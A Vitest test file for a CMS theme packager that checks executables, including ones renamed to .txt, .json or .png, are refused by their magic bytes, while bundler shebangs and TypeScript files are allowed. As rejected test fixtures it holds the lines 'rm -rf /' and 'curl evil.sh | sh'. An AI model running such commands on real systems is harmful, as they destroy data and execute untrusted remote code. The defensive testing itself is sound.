import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { packDirectory } from "../archive";
import { classifyPayloadFile, sniffExecutable } from "../payload-rules";
import { PackageError } from "../types";

/**
 * A package is a bag of files the runtime imports — never a program it runs. So
 * nothing in it should be a program.
 *
 * Both halves of that are tested here, and the second half is the one that earns
 * its keep: the rule must refuse an executable that has been RENAMED to look
 * innocent, because an author who wanted to sneak a binary into a package would
 * obviously not leave it called `install.sh`. Extension checks alone are theatre.
 *
 * The other side is pinned just as hard. A rule that rejects a legitimate theme
 * is a rule that gets deleted, and then it protects nothing — so the false
 * positives that would actually happen (a bundler's `#!` banner, a `.ts` source
 * file that is not an MPEG transport stream) each have a test saying "allowed".
 */

let tmp: string;

beforeEach(() => {
  tmp = fs.mkdtempSync(path.join(fs.realpathSync(os.tmpdir()), "zcms-payload-test-"));
});

afterEach(() => {
  fs.rmSync(tmp, { recursive: true, force: true });
});

function write(rel: string, content: string | Buffer): void {
  const full = path.join(tmp, rel);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, content);
}

/** The minimum that packs: a manifest and the entry point it names. */
function validTheme(): void {
  write("theme.json", JSON.stringify({ id: "vn.zsoft.theme.x", name: "X" }));
  write("dist/index.js", "export default {};\n");
}

const ELF = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
const MACH_O = Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 0x0c, 0x00, 0x00, 0x01]);
const PE = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);

describe("executables cannot be packed", () => {
  it.each([
    ["a shell script", "install.sh", "#!/bin/sh\nrm -rf /\n"],
    ["a Windows binary", "tool.exe", PE],
    ["a native addon", "native/parser.node", ELF],
    ["a shared library", "lib/libfoo.so", ELF],
    ["a Python script", "scripts/setup.py", "import os\n"],
  ])("refuses %s", async (_label, file, body) => {
    validTheme();
    write(file, body);

    await expect(packDirectory(tmp)).rejects.toThrow(PackageError);
    await expect(packDirectory(tmp)).rejects.toThrow(/executable/i);
  });

  /**
   * The test that matters. Every extension in the list is a door, and this is
   * someone walking around it — a shell script called `notes.txt`, a Mach-O
   * binary called `logo.png`. The first bytes give both of them away.
   */
  it.each([
    ["a shell script renamed to .txt", "docs/notes.txt", "#!/bin/bash\ncurl evil.sh | sh\n"],
    ["an ELF binary renamed to .json", "data/config.json", ELF],
    ["a Mach-O binary renamed to .png", "assets/logo.png", MACH_O],
    ["a Windows binary with no extension at all", "helper", PE],
  ])("refuses %s, by its contents", async (_label, file, body) => {
    validTheme();
    write(file, body);

    await expect(packDirectory(tmp)).rejects.toThrow(/whatever its extension says/i);
  });

  it("names every offending file, not just the first", async () => {
    validTheme();
    write("a.sh", "#!/bin/sh\n");
    write("b.exe", PE);
    write("c.mp4", "not really a video, but the name is the rule");

    await expect(packDirectory(tmp)).rejects.toThrow(/a\.sh[\s\S]*b\.exe[\s\S]*c\.mp4/);
  });
});

describe("videos are refused, and say where the video should go", () => {
  it.each([".mp4", ".mov", ".webm", ".avi", ".mkv"])("refuses a %s file", async (ext) => {
    validTheme();
    write(`media/demo${ext}`, "video bytes");

    await expect(packDirectory(tmp)).rejects.toThrow(PackageError);
  });

  /**
   * An author who packed a video wanted one of two things and does not know
   * either exists. The error is useless unless it says both, so the wording is
   * pinned — not merely the fact that something was rejected.
   */
  it("points at the Media Library for in-page video", () => {
    const issue = classifyPayloadFile("media/demo.mp4", "theme.json");

    expect(issue?.severity).toBe("block");
    expect(issue?.rule).toBe("video-file");
    expect(issue?.message).toContain("Media Library");
    expect(issue?.message).toContain("copy the URL");
  });

  it("points at media.video for a listing preview", () => {
    const issue = classifyPayloadFile("promo.mov", "plugin.json");

    expect(issue?.message).toContain("media.video");
    expect(issue?.message).toContain("plugin.json");
  });
});

describe("what must NOT be refused", () => {
  /**
   * esbuild writes `#!/usr/bin/env node` onto anything it suspects is a CLI, and
   * it is wrong about that often. A `.js` starting with `#!` is a banner, not an
   * executable — nothing in the platform would run it. Blocking it would reject
   * real, ordinary themes.
   */
  it("allows a bundler's shebang banner in a .js file", async () => {
    validTheme();
    write("dist/index.js", "#!/usr/bin/env node\nexport default {};\n");

    await expect(packDirectory(tmp)).resolves.toBeInstanceOf(Buffer);
  });

  /** ...but a .js that is secretly an ELF is not a bundler quirk. */
  it("still refuses a .js whose contents are a native binary", () => {
    write("dist/evil.js", ELF);

    expect(sniffExecutable(path.join(tmp, "dist/evil.js"), "dist/evil.js")?.severity).toBe(
      "block",
    );
  });

  /**
   * `.ts` is an MPEG transport stream AND it is TypeScript. Refusing a package
   * for shipping TypeScript would be a memorable way to discover this.
   */
  it("does not mistake a .ts file for a video", () => {
    expect(classifyPayloadFile("types.ts")).toBeNull();
  });

  it("allows an ordinary theme", async () => {
    validTheme();
    write("assets/screenshot.png", Buffer.from([0x89, 0x50, 0x4e, 0x47]));
    write("README.md", "# A theme\n");

    await expect(packDirectory(tmp)).resolves.toBeInstanceOf(Buffer);
  });
});

describe("WebAssembly is reviewed, not refused", () => {
  /**
   * A .wasm is unreadable executable code, but unlike an .exe it has a real
   * reason to be in a JavaScript package. So it takes the same route as obfuscated
   * source — a human decides — rather than being blocked at the door.
   */
  it("warns rather than blocks", () => {
    expect(classifyPayloadFile("dist/codec.wasm")?.severity).toBe("warn");
  });

  it("does not stop the package from being packed", async () => {
    validTheme();
    write("dist/codec.wasm", Buffer.from([0x00, 0x61, 0x73, 0x6d]));

    await expect(packDirectory(tmp)).resolves.toBeInstanceOf(Buffer);
  });
});
